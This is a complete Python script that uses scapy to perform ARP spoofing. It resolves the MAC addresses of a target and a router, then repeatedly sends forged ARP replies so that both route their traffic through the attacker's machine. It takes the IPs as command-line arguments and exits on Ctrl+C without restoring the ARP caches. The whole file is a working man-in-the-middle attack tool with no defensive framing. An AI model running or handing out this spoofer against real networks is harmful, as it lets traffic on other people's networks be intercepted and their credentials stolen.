import scapy.all as scapy
import time
import sys

#Method to get MAC adddress
def get_mac_address(ipaddress):
    broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_layer = scapy.ARP(pdst=ipaddress)
    entire_packet = broadcast_layer / arp_layer
    answer = scapy.srp(entire_packet, timeout=2, verbose=True)[0]

    return answer[0][1].hwsrc

#Method to spoof
def spoof(router_ip, target_ip, router_mac, target_mac):
    packet_1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
    packet_2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)
    scapy.send(packet_1)
    scapy.send(packet_2)


#Takes target ip and router ip as arguments
target_ip = str(sys.argv[2])
router_ip = str(sys.argv[1])

#Gets the pysical/mac address of the target and router
target_mac = str(get_mac_address(target_ip))
router_mac = str(get_mac_address(router_ip))

#Spoof target and router
try:
    while True:
        spoof(router_ip, target_ip, router_mac, target_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print('Closing ARP-Spoofer')
    exit(0)
